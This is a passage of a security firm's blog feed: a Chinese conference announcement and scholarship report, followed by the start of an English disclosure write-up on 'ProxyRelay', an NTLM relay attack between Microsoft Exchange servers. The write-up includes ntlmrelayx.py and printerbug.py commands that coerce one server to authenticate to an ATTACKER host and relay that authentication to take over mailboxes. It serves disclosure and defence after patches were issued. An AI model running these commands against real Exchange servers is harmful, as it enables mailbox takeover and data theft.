&lt;p&gt;駭客場將分享最新漏洞研究及真實紅隊演練案例，包含：從零開始的 Pwn2Own 駭客大賽奪冠之路、如何以 MITRE ATT&amp;amp;CK 框架檢視紅隊演練、SSRF 攻擊手法與實戰精華、Email 現代攻擊手法、如何將廢洞串接成 RCE 漏洞、虛擬機之安全挑戰、物聯網裝置攻擊實例。企業場則將以深入淺出的方式分享台灣資安十年更新迭代、DEVCORE 十年資安奇幻旅程、紅隊演練策略使用方式與真正價值、企業常見資安風險、最讓駭客頭痛的資安防禦機制等。&lt;/p&gt;

&lt;h2 id=&quot;活動資訊&quot;&gt;活動資訊&lt;/h2&gt;

&lt;h3 id=&quot;時間&quot;&gt;時間：&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;企業場：2023/03/10（五）13:00 - 16:30（報名審核制）&lt;/li&gt;
  &lt;li&gt;駭客場：2023/03/11（六）08:40 - 16:20（收費制）&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;地點&quot;&gt;地點：&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;TICC 台北國際會議中心 201 會議室（台北市信義區信義路五段1號）&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;費用&quot;&gt;費用：&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;2023/03/10（五）企業場：免費&lt;/li&gt;
  &lt;li&gt;2023/03/11（六）駭客場（十週年特惠價）：早鳥票 3,000 元（限額 150 名）；晚鳥票 5,000 元；學生票 1,500 元&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;議程介紹&quot;&gt;議程介紹&lt;/h2&gt;

&lt;h3 id=&quot;20230310五企業場&quot;&gt;2023/03/10（五）企業場：&lt;/h3&gt;

&lt;p&gt;本場次專為企業決策者及資安管理者量身打造，將從 DEVCORE 為何於 2017 年發現客戶需求、首先推出紅隊演練開始，細數 5 年來我們在近 70 場紅隊演練中的珍貴發現，包含供應鏈中易被忽略的資安風險、資安策略與機制優先順序如何斟酌、資安產品有效性驗證等。&lt;/p&gt;

&lt;p&gt;此外，我們也將透過此場研討會，協助企業理解如何打造最適合的資安戰略，並能有效、正確使用紅隊演練此項策略工具，達到識別風險、並發揮紅隊演練最大效益。&lt;/p&gt;

&lt;p&gt;在企業場中，我們也特別納入企業最常見的資安問題、如何自我評估安全、如何保護網域服務（AD）等，建立資安自保觀念後，再進一步探討哪些防禦機制與產業尤難攻陷、攻擊者如何情蒐與挑選目標等。&lt;/p&gt;

&lt;p&gt;面對永不停歇的網路戰，建構正確的資安策略，將是迎戰的第一步，而唯有了解真實的駭客思維與攻擊方式，才能確保企業立於不敗之地。&lt;/p&gt;

&lt;h3 id=&quot;20230311六駭客場&quot;&gt;2023/03/11（六）駭客場：&lt;/h3&gt;

&lt;p&gt;本場次將深入探討最新攻擊手法與漏洞，適合資安技術人員及有興趣的資安管理階層參與。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;以紅隊思維看藍隊防禦，紅藍攻防中的經典案例&lt;/strong&gt;
具備豐富指揮作戰經驗的 DEVCORE 紅隊演練隊長 Ding，將於本場議程中分享近 70 場橫跨金融、科技、電商、傳產等各產業經典案例，並以 MITRE ATT&amp;amp;CK 框架，逐一分析實戰經驗中使用的戰術與攻擊手法：初始入侵除了OWASP TOP 10 中常見攻擊技巧外還有哪些方式？攻擊者如何持續潛伏，且同時達成防毒軟體未示警、亦無檔案落地？攻擊者如何在網路實體隔離時仍能橫向移動？攻擊者如何以出人意料的手段提升權限？&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;讓流量穿過你的巴巴 - 紅隊實戰 SSRF 經典案例&lt;/strong&gt;
儘管 SSRF 是一個歷史悠久的知名攻擊手法，攻擊者可藉此穿過外網防火牆、入侵內網，但相較於指令注入或任意檔案上傳等類 RCE 漏洞，其嚴重性似乎略遜一籌。紅隊演練專家 Vtim 將以過去於紅隊演練專案中遇到的 SSRF 真實案例，探討其究竟是報告上有名無實的高風險漏洞，或是企業仍不能忽視的重要安全問題。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;I wanna know 你信不信 - 現代郵件詐術&lt;/strong&gt;
去年於國際技能競賽網路安全職類取得銀牌的台灣國手，同時也是 DEVCORE 紅隊演練專家的 Mico，將於此場議程中分享各種企業組織與個人收信方式組合式攻擊手法，並逐一剖析攻擊者如何使用 Email 偽造欺騙以及繞過垃圾郵件過濾器，協助企業防範以 Email 做為初始入侵點的攻擊。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;黑魔法、大壞蛋得崩，讓四個臭蟲變成漏洞吧！&lt;/strong&gt;
再廢的低分漏洞也有春天！雞肋般的弱點，對紅隊而言還有任何利用價值嗎？低風險、利用機會也低的小漏洞，企業真的可以置之不理嗎？DEVCORE 資深紅隊演練專家 Cyku 及 技術專案經理 Crystal 將透過實際案例，分享攻擊者如何將四個 CVSS 幾乎 0.0 分的廢洞化腐朽為神奇，串成 RCE 漏洞。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;挑戰百萬賞金！虛擬世界之密室逃脫&lt;/strong&gt;
以虛擬機分析惡意程式是目前被廣泛採用的分析方式之一，然而其背後卻可能存在易被忽略的安全問題及漏洞。曾獲駭客奧斯卡 Pwnie Awards 「最佳伺服器漏洞」 肯定的資深資安研究員 Meh 將以 VMware 中潛藏於 DHCP 協議的漏洞為例，與聽眾分享虛擬機潛在的資安風險以及其研究成果。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remote Door Execution&lt;/strong&gt;
家用物聯網裝置被駭客用以監看或監聽已是廣為人知的資安問題，然而若門鎖也能被遠端遙控開啟，除了個人隱私遭到侵犯，更是居家安全的重大威脅。與研究團隊共同奪得 Pwn2Own Toronto 2022 冠軍的資安研究員 Nini，將於本場議程中分享其如何嘗試透過軟硬體攻擊，最終在電子鎖上發掘可以任意開門的漏洞。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;From Zero to Hero - 從零開始的 Pwn2Own 奪冠之路&lt;/strong&gt;
DEVCORE 自 2020 年開始參與白帽駭客最高殿堂競賽 Pwn2Own，迄今拿下兩次亞軍、兩次冠軍。此場議程將由駭客界頗負盛名、屢屢獲獎並受邀演講的 DEVCORE 首席資安研究員 Orange 及資深資安研究員 Angelboy 共同主講，與會眾分享如何挑選目標、建立團隊默契、試誤與學習、與廠商之間的攻防戰等參賽背後秘辛與趣事。&lt;/p&gt;

&lt;h2 id=&quot;議程表&quot;&gt;議程表&lt;/h2&gt;

&lt;h3 id=&quot;20230310五企業場-1&quot;&gt;2023/03/10（五）企業場：&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;時間&lt;/th&gt;
      &lt;th&gt;議程&lt;/th&gt;
      &lt;th&gt;講師&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;13:00 - 13:30&lt;/td&gt;
      &lt;td&gt;來賓報到&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:30 - 13:40&lt;/td&gt;
      &lt;td&gt;開幕&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:40 - 14:10&lt;/td&gt;
      &lt;td&gt;攻擊一日，創業十年&lt;/td&gt;
      &lt;td&gt;DEVCORE 執行長暨共同創辦人 Allen&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:10 - 14:40&lt;/td&gt;
      &lt;td&gt;紅隊紅隊，多少服務假汝之名而行！&lt;/td&gt;
      &lt;td&gt;DEVCORE 商務發展總監 Aaron&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:40 - 15:20&lt;/td&gt;
      &lt;td&gt;中場休息&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:20 - 15:50&lt;/td&gt;
      &lt;td&gt;紅隊常見 Q&amp;amp;A 大解密&lt;/td&gt;
      &lt;td&gt;DEVCORE 資深副總暨共同創辦人 Bowen&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:50 - 16:20&lt;/td&gt;
      &lt;td&gt;紅隊的下一步 Ver. 2023&lt;/td&gt;
      &lt;td&gt;DEVCORE 紅隊總監暨共同創辦人 Shaolin&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;16:20 - 16:30&lt;/td&gt;
      &lt;td&gt;閉幕&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;20230311六駭客場-1&quot;&gt;2023/03/11（六）駭客場：&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;時間&lt;/th&gt;
      &lt;th&gt;議程&lt;/th&gt;
      &lt;th&gt;講師&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;08:40 - 09:30&lt;/td&gt;
      &lt;td&gt;來賓報到&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;09:30 - 09:40&lt;/td&gt;
      &lt;td&gt;開幕&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;09:40 - 10:10&lt;/td&gt;
      &lt;td&gt;以紅隊思維看藍隊防禦，紅藍攻防中的經典案例&lt;/td&gt;
      &lt;td&gt;DEVCORE 紅隊演練隊長 Ding&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10:10 - 10:40&lt;/td&gt;
      &lt;td&gt;讓流量穿過你的巴巴 - 紅隊實戰 SSRF 經典案例&lt;/td&gt;
      &lt;td&gt;DEVCORE 紅隊演練專家 Vtim&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10:40 - 11:00&lt;/td&gt;
      &lt;td&gt;中場休息&lt;/td&gt;
      &lt;td&gt;/&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11:00 - 11:30&lt;/td&gt;
      &lt;td&gt;I wanna know 你信不信 - 現代郵件詐術&lt;/td&gt;
      &lt;td&gt;DEVCORE 紅隊演練專家 Mico&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11:30 - 12:00&lt;/td&gt;
      &lt;td&gt;黑魔法、大壞蛋得崩，讓四個臭蟲變成漏洞吧！&lt;/td&gt;
      &lt;td&gt;DEVCORE 資深紅隊演練專家 Cyku&lt;br /&gt; &amp;amp; 技術專案經理 Crystal&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12:00 - 13:30&lt;/td&gt;
      &lt;td&gt;午餐休息&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;13:30 - 14:00&lt;/td&gt;
      &lt;td&gt;挑戰百萬賞金！虛擬世界之密室逃脫&lt;/td&gt;
      &lt;td&gt;DEVCORE 資深資安研究員 Meh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:00 - 14:30&lt;/td&gt;
      &lt;td&gt;Remote Door Execution&lt;/td&gt;
      &lt;td&gt;DEVCORE 資安研究員 Nini&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;14:30 - 15:10&lt;/td&gt;
      &lt;td&gt;中場休息&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:10 - 16:10&lt;/td&gt;
      &lt;td&gt;From Zero to Hero - 從零開始的 Pwn2Own 奪冠之路&lt;/td&gt;
      &lt;td&gt;DEVCORE 首席資安研究員 Orange&lt;br /&gt; &amp;amp; 資深資安研究員 Angelboy&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;16:10 - 16:20&lt;/td&gt;
      &lt;td&gt;閉幕&lt;/td&gt;
      &lt;td&gt;／&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;詳細資訊及報名方式請至 KKTIX 查詢：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;3/10 企業場：&lt;a href=&quot;https://devcore.kktix.cc/events/devcoreconf2023-0310&quot;&gt;https://devcore.kktix.cc/events/devcoreconf2023-0310&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;3/11 駭客場：&lt;a href=&quot;https://devcore.kktix.cc/events/devcoreconf2023&quot;&gt;https://devcore.kktix.cc/events/devcoreconf2023&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/01/12/DEVCORE-conference-registration-open-now/</link>
                <guid>https://devco.re/blog/2023/01/12/DEVCORE-conference-registration-open-now</guid>
                <pubDate>Thu, 12 Jan 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2022 年度全國資訊安全獎學金頒獎餐敘順利落幕</title>
                <description>&lt;p&gt;2022 年度「戴夫寇爾全國資訊安全獎學金」頒獎餐敘已於 12 月 17 日順利落幕。&lt;/p&gt;

&lt;p&gt;一路走來，無論是在我們的學習之路、創業過程中，我們都受到了來自各方的支持與協助，因此我們也希望回饋社會並培育資安人才，以獎學金的方式，協助學生建構正確資安意識及技能外，也能及早瞭解業界現況，降低產學落差。&lt;/p&gt;

&lt;p&gt;「戴夫寇爾全國資訊安全獎學金」每年補助 10 名在資安領域研究成果傑出的大專院校學生，每名頒發 2 萬元獎金，希望使這些資安界的明日之星得以無後顧之憂，專注精進資安技術，未來成為獨當一面的資安人才。&lt;/p&gt;

&lt;p&gt;此次獲獎同學遍佈全台，分別來自基隆商工資訊科、台灣師範大學資訊工程系、陽明交通大學資訊科學與工程研究所及資電亥客與安全學程、清華大學資訊安全研究所、逢甲大學資訊工程系、台中科技大學資訊管理系、南台科技⼤學資訊工程系等。獲獎同學皆將獲獎視為重要肯定，也表示希望持續精進自己，並將經驗分享給他人、回饋社會，其中也有好幾位同學希望未來能加入 DEVCORE。&lt;/p&gt;

&lt;p&gt;「當時受到 DEVCORE 幫助，我說未來一定找機會好好感謝 DEVCORE。但 DEVCORE 回應『只要把這份感謝的心情，拿去幫助其他人，就是最好的回報』，因為這句話，我寫了一些文章，希望能幫助到其他人。在未來，我也會繼續幫助其他人，以此來回報貴公司在資安界無私的奉獻。」清大蘇同學說。&lt;/p&gt;

&lt;p&gt;陽明交通大學高同學則表示，將運用這筆獎學金購買原本負擔不起的昂貴物聯網設備及相關工具，以利進行資安相關研究，也將購入資訊相關書籍，提升自己的知識。&lt;/p&gt;

&lt;p&gt;期待獲獎同學們未來持續深耕資安知識與技術，在資安舞台上發光發熱！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/12/23/2022-devcore-national-cyber-security-scholarship-results-announcement/</link>
                <guid>https://devco.re/blog/2022/12/23/2022-devcore-national-cyber-security-scholarship-results-announcement</guid>
                <pubDate>Fri, 23 Dec 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 4 - ProxyRelay!</title>
                <description>&lt;p&gt;Hi, this is a long-time-pending article. We could have published this article earlier (the original bug was reported to MSRC in June 2021 with a 90-days Public Disclosure Policy). However, during communications with MSRC, they explained that since this is an architectural design issue, lots of code changes and testings are expected and required, so they hope to resolve this problem with a one-time CU (Cumulative Update) instead of the regular Patch Tuesday. We understand their situation and agree to extend the deadline.&lt;/p&gt;

&lt;p&gt;Microsoft eventually released &lt;a href=&quot;https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8&quot;&gt;Exchange Server 2019 CU 12&lt;/a&gt; and &lt;a href=&quot;https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678&quot;&gt;Exchange Server 2016 CU 23&lt;/a&gt; on April 20, 2022. However, &lt;strong&gt;this patch did not enable by default&lt;/strong&gt;. Microsoft didn’t release the patch-activating methods until August 09, 2022. So, we originally had the opportunity to demonstrate our attack at &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2022/1/12/pwn2own-vancouver-2022-luanch&quot;&gt;Pwn2Own Vancouver 2021&lt;/a&gt;. However, we dropped the idea quickly because our intention is not to earn bounties. We are here to &lt;a href=&quot;https://devco.re/en/about/&quot;&gt;secure the world&lt;/a&gt;! You can check the &lt;a href=&quot;#Timeline&quot;&gt;Timeline&lt;/a&gt; to know the detailed disclosure process.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;idea&quot;&gt;Idea&lt;/h1&gt;

&lt;p&gt;Since Microsoft blocked our Proxy-Related attacks in April 2021, I have been thinking about whether there is a way to bypass the mitigation. During that April patch, Microsoft enhanced the authentication part of CAS Frontend by requiring all HTTP requests that need a Kerberos Ticket to be authenticated first. This enhancement effectively mitigated the attack surface we proposed and stopped unauthenticated HTTP requests accessing the CAS Backend. So Exchange is safe now?&lt;/p&gt;

&lt;p&gt;Of course not, and this article is to prove this! Since Microsoft only fixes the problematic code, we proposed several attacks and possible weaknesses in our &lt;a href=&quot;https://powerofcommunity.net/2021.htm&quot;&gt;POC 2021&lt;/a&gt; and &lt;a href=&quot;https://hitcon.org/2021/agenda/279d7810-e619-4dc3-9113-b11bad5277ec/&quot;&gt;HITCON 2021&lt;/a&gt; talks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20221019/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Maybe you have heard that our first prediction has already been made in recent &lt;a href=&quot;https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9&quot;&gt;ProxyNotShell&lt;/a&gt;. The attack reuses the path confusion of ProxyShell but attaches a pre-known authentication instead. It’s solid but it looks it still needs a valid authentication (not sure, still haven’t time to dig into). However, we hinted there is another way not to fight with the auth-enhancement face-to-face during my talks. Now we can finally disclose it :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Just in case you don’t know, I am a big fan of &lt;a href=&quot;https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn&quot;&gt;Printer Bug&lt;/a&gt; (kudos to &lt;a href=&quot;https://twitter.com/tifkin_&quot;&gt;Lee Christensen&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;Will Schroeder&lt;/a&gt;, and &lt;a href=&quot;https://twitter.com/enigma0x3&quot;&gt;Matt Nelson&lt;/a&gt; for their amazing talk at &lt;a href=&quot;https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory&quot;&gt;DerbyCon 2018&lt;/a&gt;). PrinterBug allows an attacker to coerce any domain-joined machine to initiate an SMB connection with its own Machine Account to the attacker via &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1&quot;&gt;MS-RPRN&lt;/a&gt; protocol. Because this behavior works as designed, this hacker-friendly feature has been extensively used for NTLM relaying for years.&lt;/p&gt;

&lt;p&gt;In the architecture of Exchange CAS, Backend authorizes an HTTP request to have the ability to impersonate any user by checking whether the login identity has the Extended Right of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ms-Exch-EPI-Token-Serialization&lt;/code&gt; or not. Also, during the Exchange Server installation, the mailbox server will be added to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Servers group&lt;/code&gt; automatically, and all objects in this Active Directory group have that Token-Serialization right by default.&lt;/p&gt;

&lt;p&gt;With the prior knowledge in mind, I come up with a simple idea. It’s common to see multiple Exchange Servers in corporate networks for high availability and site resilience. &lt;strong&gt;Can we relay the NTLM authentication among Exchange Servers?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There are several pros to this relay idea. Since it’s a cross-machine relay, it won’t be limited by the same-host restriction. Also, because the NTLM authentication is initiated by the Machine Account of Exchange Server, the relayed authentication owns the Token-Serialization right that allows us to impersonate any user in Exchange services. I believe this is a fantastic idea and would like to explore if it is exploitable!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. This attack surface was also found and reported to MSRC independently by &lt;a href=&quot;https://twitter.com/D1iv3&quot;&gt;Dlive&lt;/a&gt; from Tencent Xuanwu Lab, so you can see we share most of the CVE acknowledgments.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;Let’s talk about the vulnerabilities. Since it’s an entire attack surface instead of a single bug, this idea could be applied to different contexts, causing different vulnerabilities. The impact of these vulnerabilities is that an attacker can bypass Exchange authentications or even get code execution without user-interaction. Here are the related CVEs so far:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt; - Relay to Exchange FrontEnd&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979&quot;&gt;CVE-2022-21979&lt;/a&gt; - Relay to Exchange BackEnd&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414&quot;&gt;CVE-2021-26414&lt;/a&gt; - Relay to Windows DCOM&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-RESERVED&quot;&gt;CVE-2022-RESERVED&lt;/a&gt; - Relay to other services of Exchange&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following attacks have the similar template, the host &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; stands for the first Exchange Server, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; for the second Exchange Server, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; for the attacker-controlled server.&lt;/p&gt;

&lt;p&gt;In all attacks, the attacker coerces the first Exchange Server to initiate an NTLM authentication to him, and relay it to the second Exchange Server. We use &lt;a href=&quot;https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py&quot;&gt;printerbug.py&lt;/a&gt; to coerce a server to initiate an SMB connection and use &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py&quot;&gt;ntlmrelayx.py&lt;/a&gt; to catch the NTLM and relay the authentication to another Exchange Server.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-1---relay-to-exchange-frontend&quot;&gt;Round 1 - Relay to Exchange FrontEnd&lt;/h2&gt;

&lt;p&gt;For the first context, we try to relay the authentication to another Frontend of Exchange Server. Since the identity of the relayed authentication is Exchange’s Machine Account which owns the Token-Serialization right, we can impersonate any user! Here we relay the NTLM authentication from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;’s Frontend EWS service as the showcase. We implement the relay-to-frontend-EWS attack by customizing the &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py&quot;&gt;httpattack.py&lt;/a&gt;! Here is a simple overview:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntlmrelayx.py&lt;/code&gt; on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; server to wait for NTLM authentications.&lt;/li&gt;
  &lt;li&gt;Use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printerbug.py&lt;/code&gt; to coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to initiate an SMB connection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Receive the SMB connection on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; and relay the NTLM blobs to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Complete the NTLM handshakes to get full access to the EWS endpoint.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Terminal 1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python ntlmrelayx.py &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; https://EX02/EWS/Exchange.asmx

&lt;span class=&quot;c&quot;&gt;# Terminal 2&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python printerbug.py EX01 ATTACKER
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Theoretically, we can take over the target mailbox by &lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange&quot;&gt;EWS operations&lt;/a&gt;. Here we give a demo to dump the secret under administrator’s mailbox.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/IFRvmo6AZoY&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h3 id=&quot;patching-frontend&quot;&gt;Patching FrontEnd&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt; and released a patch to fix that Frontend is relay-able in July 2021. Since logging in as Machine Account in Frontend isn’t a regular operation, it’s easy to mitigate the attack by adding a check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsSystemOrMachineAccount()&lt;/code&gt; on the Frontend Proxy-Handler to ensure all Frontend logons are not Machine Account.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-2---relay-to-exchange-backend&quot;&gt;Round 2 - Relay to Exchange BackEnd&lt;/h2&gt;

&lt;p&gt;Relaying to Frontend can be easily mitigated by a simple check. How about relaying to Backend? Since Backend verifies the Frontend requests by checking whether it’s a Machine Account or not, mitigating Backend would be more challenging because it’s a regular operation and Backend needs the Machine Account that hash the extended right of ms-Exch-EPI-Token-Serialization to impersonate to the desired user. Here we provide 3 showcases against attacking Backend.&lt;/p&gt;

&lt;h3 id=&quot;2-1-attacking-backend-ews&quot;&gt;2-1 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/EWS&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;Based on the relay-to-frontend EWS attack we introduced, the earlier attack can be re-applied to Backend seamlessly. The only change is to modify the target port from 443 to 444.&lt;/p&gt;

&lt;h3 id=&quot;2-2-attacking-backend-rpc&quot;&gt;2-2 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/RPC&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;The other showcase is attacking &lt;a href=&quot;https://learn.microsoft.com/en-us/exchange/outlook-anywhere-exchange-2013-help&quot;&gt;Outlook Anywhere&lt;/a&gt;. Exchange defines several internal RPC services that can directly operate the mailbox. Those RPC services have a public interface and can be access through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/*&lt;/code&gt;, and users can access their own mailbox via RPC-over-HTTP protocol, which is described in Microsoft’s &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpch/c0f4c9c5-1a61-4d10-b8e2-005378d1d212&quot;&gt;MS-RPCH&lt;/a&gt; specification. For those who want to understand the underlying mechanism, it’s recommended to read the awesome research &lt;a href=&quot;https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/&quot;&gt;Attacking MS Exchange Web Interfaces&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_mohemiv&quot;&gt;Arseniy Sharoglazov&lt;/a&gt; for details.&lt;/p&gt;

